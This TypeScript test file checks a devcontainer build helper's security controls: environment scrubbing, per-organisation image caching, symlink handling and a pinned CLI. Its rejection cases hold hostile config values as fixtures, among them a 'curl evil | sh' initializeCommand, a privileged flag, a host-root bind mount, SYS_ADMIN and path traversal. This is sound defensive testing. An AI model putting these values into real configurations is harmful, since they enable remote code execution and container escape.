import { describe, expect, it, beforeEach, afterEach } from 'vitest';
import { promises as fs } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {
  devcontainerImageTag,
  maybeBuildDevcontainer,
  parseJsonc,
  resolvePinnedDevcontainerCli,
  type ExecFileAsync,
} from '../src/devcontainer-build.js';

const logger = {
  info: () => undefined,
  warn: () => undefined,
  error: () => undefined,
  debug: () => undefined,
  trace: () => undefined,
  fatal: () => undefined,
  silent: () => undefined,
  level: 'info',
  child: () => logger,
} as any;

const ENABLED = { MERGECREW_ENABLE_DEVCONTAINER_BUILD: '1', PATH: '/usr/bin:/bin' } as NodeJS.ProcessEnv;

type StubResponse = { stdout?: string; stderr?: string; rejectWith?: Error };

/** Compose a fake ExecFileAsync that records calls and replies from a script. */
function makeExecStub(handlers: Array<{
  match: (cmd: string, args: string[]) => boolean;
  reply: StubResponse;
}>): { calls: Array<{ cmd: string; args: string[]; env?: NodeJS.ProcessEnv }>; fn: ExecFileAsync } {
  const calls: Array<{ cmd: string; args: string[]; env?: NodeJS.ProcessEnv }> = [];
  const fn: ExecFileAsync = async (cmd, args, opts) => {
    calls.push({ cmd, args, env: opts?.env });
    for (const h of handlers) {
      if (h.match(cmd, args)) {
        if (h.reply.rejectWith) throw h.reply.rejectWith;
        return { stdout: h.reply.stdout ?? '', stderr: h.reply.stderr ?? '' };
      }
    }
    return { stdout: '', stderr: '' };
  };
  return { calls, fn };
}

const isBuild = (_c: string, a: string[]) => a.includes('build');
const isInspect = (c: string, a: string[]) => c === 'docker' && a[0] === 'image';

describe('maybeBuildDevcontainer', () => {
  let workspace: string;

  beforeEach(async () => {
    workspace = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), 'devcontainer-test-')));
  });

  afterEach(async () => {
    await fs.rm(workspace, { recursive: true, force: true });
  });

  async function writeConfig(cfg: string, extra: Record<string, string> = {}) {
    await fs.mkdir(path.join(workspace, '.devcontainer'), { recursive: true });
    await fs.writeFile(path.join(workspace, '.devcontainer', 'devcontainer.json'), cfg);
    for (const [rel, body] of Object.entries(extra)) {
      await fs.mkdir(path.dirname(path.join(workspace, rel)), { recursive: true });
      await fs.writeFile(path.join(workspace, rel), body);
    }
  }

  it('is disabled unless MERGECREW_ENABLE_DEVCONTAINER_BUILD=1', async () => {
    await writeConfig('{"image":"node:20"}');
    const { calls, fn } = makeExecStub([]);
    const r = await maybeBuildDevcontainer({ workspacePath: workspace, organizationId: 'org-a', logger, execFileAsync: fn, env: {} });
    expect(r.kind).toBe('disabled');
    expect(calls).toHaveLength(0);
  });

  it('returns no_devcontainer when no config exists', async () => {
    const { fn } = makeExecStub([]);
    const r = await maybeBuildDevcontainer({ workspacePath: workspace, organizationId: 'org-a', logger, execFileAsync: fn, env: ENABLED });
    expect(r.kind).toBe('no_devcontainer');
  });

  it('does not follow a symlinked devcontainer.json out of the workspace', async () => {
    await fs.mkdir(path.join(workspace, '.devcontainer'));
    const outside = path.join(os.tmpdir(), `dc-outside-${Date.now()}.json`);
    await fs.writeFile(outside, '{"image":"x"}');
    await fs.symlink(outside, path.join(workspace, '.devcontainer', 'devcontainer.json'));
    const { calls, fn } = makeExecStub([]);
    const r = await maybeBuildDevcontainer({ workspacePath: workspace, organizationId: 'org-a', logger, execFileAsync: fn, env: ENABLED });
    expect(r.kind).toBe('no_devcontainer');
    expect(calls).toHaveLength(0);
    await fs.rm(outside, { force: true });
  });

  it('builds with the pinned CLI via node (no npx), minimal env, org label', async () => {
    await writeConfig('{ // comment\n "build": { "dockerfile": "Dockerfile", }, }', { '.devcontainer/Dockerfile': 'FROM node:20\n' });
    const { calls, fn } = makeExecStub([{ match: isInspect, reply: { rejectWith: new Error('no such image') } }]);
    const prev = process.env.KMS_MASTER_KEY;
    process.env.KMS_MASTER_KEY = 'super-secret-kms';
    try {
      const r = await maybeBuildDevcontainer({
        workspacePath: workspace,
        organizationId: 'org-a',
        logger,
        execFileAsync: fn,
        env: { ...process.env, ...ENABLED },
        cliPath: '/opt/pinned/devcontainer.js',
      });
      expect(r.kind).toBe('built');
    } finally {
      if (prev === undefined) delete process.env.KMS_MASTER_KEY;
      else process.env.KMS_MASTER_KEY = prev;
    }
    const build = calls.find((c) => isBuild(c.cmd, c.args))!;
    expect(build.cmd).toBe(process.execPath);
    expect(build.args[0]).toBe('/opt/pinned/devcontainer.js');
    expect(calls.some((c) => c.cmd === 'npx' || c.args.includes('-y'))).toBe(false);
    expect(build.args).toContain('--label');
    expect(build.args).toContain('mergecrew.organizationId=org-a');
    expect(build.env?.KMS_MASTER_KEY).toBeUndefined();
    for (const k of Object.keys(build.env ?? {})) expect(['HOME', 'PATH', 'LANG', 'DOCKER_HOST', 'DOCKER_CONTEXT', 'DOCKER_CERT_PATH', 'DOCKER_TLS_VERIFY']).toContain(k);
  });

  it.each([
    ['runArgs', '{"image":"x","runArgs":["--privileged"]}'],
    ['mounts', '{"image":"x","mounts":["source=/,target=/host,type=bind"]}'],
    ['privileged', '{"image":"x","privileged":true}'],
    ['capAdd', '{"image":"x","capAdd":["SYS_ADMIN"]}'],
    ['initializeCommand', '{"image":"x","initializeCommand":"curl evil | sh"}'],
    ['dockerComposeFile', '{"dockerComposeFile":"compose.yml","service":"app"}'],
    ['build.options', '{"build":{"dockerfile":"Dockerfile","options":["--network=host"]}}'],
    ['context outside', '{"build":{"dockerfile":"Dockerfile","context":"../.."}}'],
    ['absolute context', '{"build":{"dockerfile":"Dockerfile","context":"/"}}'],
    ['dockerfile outside', '{"build":{"dockerfile":"../../../etc/Dockerfile"}}'],
  ])('rejects %s', async (_name, cfg) => {
    await writeConfig(cfg, { '.devcontainer/Dockerfile': 'FROM node:20\n' });
    const { calls, fn } = makeExecStub([]);
    const r = await maybeBuildDevcontainer({ workspacePath: workspace, organizationId: 'org-a', logger, execFileAsync: fn, env: ENABLED, cliPath: '/x' });
    expect(r.kind).toBe('rejected');
    expect(calls).toHaveLength(0);
  });

  it('rejects a build context that resolves outside via a symlinked directory', async () => {
    const outside = await fs.mkdtemp(path.join(os.tmpdir(), 'dc-ctx-'));
    await writeConfig('{"build":{"dockerfile":"Dockerfile","context":"../ctx"}}', { '.devcontainer/Dockerfile': 'FROM x' });
    await fs.symlink(outside, path.join(workspace, 'ctx'));
    const { fn } = makeExecStub([]);
    const r = await maybeBuildDevcontainer({ workspacePath: workspace, organizationId: 'org-a', logger, execFileAsync: fn, env: ENABLED, cliPath: '/x' });
    expect(r.kind).toBe('rejected');
    await fs.rm(outside, { recursive: true, force: true });
  });

  it('cache key = org + full build context: identical configs in two orgs never share an image', async () => {
    await writeConfig('{"build":{"dockerfile":"Dockerfile"}}', { '.devcontainer/Dockerfile': 'FROM node:20\n' });
    const seen: string[] = [];
    const fn: ExecFileAsync = async (_c, args) => {
      if (args[0] === 'image') throw new Error('nope');
      const i = args.indexOf('--image-name');
      if (i >= 0) seen.push(args[i + 1]!);
      return { stdout: '', stderr: '' };
    };
    await maybeBuildDevcontainer({ workspacePath: workspace, organizationId: 'org-a', logger, execFileAsync: fn, env: ENABLED, cliPath: '/x' });
    await maybeBuildDevcontainer({ workspacePath: workspace, organizationId: 'org-b', logger, execFileAsync: fn, env: ENABLED, cliPath: '/x' });
    // Same JSON, different Dockerfile content → different key.
    await fs.writeFile(path.join(workspace, '.devcontainer', 'Dockerfile'), 'FROM node:22\n');
    await maybeBuildDevcontainer({ workspacePath: workspace, organizationId: 'org-a', logger, execFileAsync: fn, env: ENABLED, cliPath: '/x' });
    expect(new Set(seen).size).toBe(3);
    for (const s of seen) expect(s).toMatch(/^mergecrew-devcontainer:[a-f0-9]{12}-[a-f0-9]{24}$/);
  });

  it('returns cached only when the cached image carries this org label', async () => {
    await writeConfig('{"image":"node:20"}');
    const mine = makeExecStub([{ match: isInspect, reply: { stdout: JSON.stringify({ 'mergecrew.organizationId': 'org-a' }) } }]);
    const r1 = await maybeBuildDevcontainer({ workspacePath: workspace, organizationId: 'org-a', logger, execFileAsync: mine.fn, env: ENABLED, cliPath: '/x' });
    expect(r1.kind).toBe('cached');
    const theirs = makeExecStub([{ match: isInspect, reply: { stdout: JSON.stringify({ 'mergecrew.organizationId': 'org-b' }) } }]);
    const r2 = await maybeBuildDevcontainer({ workspacePath: workspace, organizationId: 'org-a', logger, execFileAsync: theirs.fn, env: ENABLED, cliPath: '/x' });
    expect(r2.kind).toBe('built');
  });

  it('returns failed with a clean reason when the CLI fails', async () => {
    await writeConfig('{"image":"node:20"}');
    const err = Object.assign(new Error('build failed'), { stderr: 'oops' });
    const { fn } = makeExecStub([
      { match: isInspect, reply: { rejectWith: new Error('no image') } },
      { match: isBuild, reply: { rejectWith: err } },
    ]);
    const r = await maybeBuildDevcontainer({ workspacePath: workspace, organizationId: 'org-a', logger, execFileAsync: fn, env: ENABLED, cliPath: '/x' });
    expect(r.kind).toBe('failed');
    if (r.kind === 'failed') expect(r.reason).toMatch(/devcontainer build failed/);
  });
});

describe('helpers', () => {
  it('parseJsonc handles comments, strings with slashes and trailing commas', () => {
    expect(parseJsonc('{ "a": "http://x//y", /* c */ "b": [1,2,], // t\n }')).toEqual({ a: 'http://x//y', b: [1, 2] });
  });

  it('resolves the lockfile-pinned CLI from node_modules', () => {
    const p = resolvePinnedDevcontainerCli();
    expect(p).toMatch(/@devcontainers[\\/]cli[\\/]devcontainer\.js$/);
  });

  it('image tag embeds an org hash', () => {
    expect(devcontainerImageTag('a', 'f'.repeat(64))).not.toBe(devcontainerImageTag('b', 'f'.repeat(64)));
  });
});
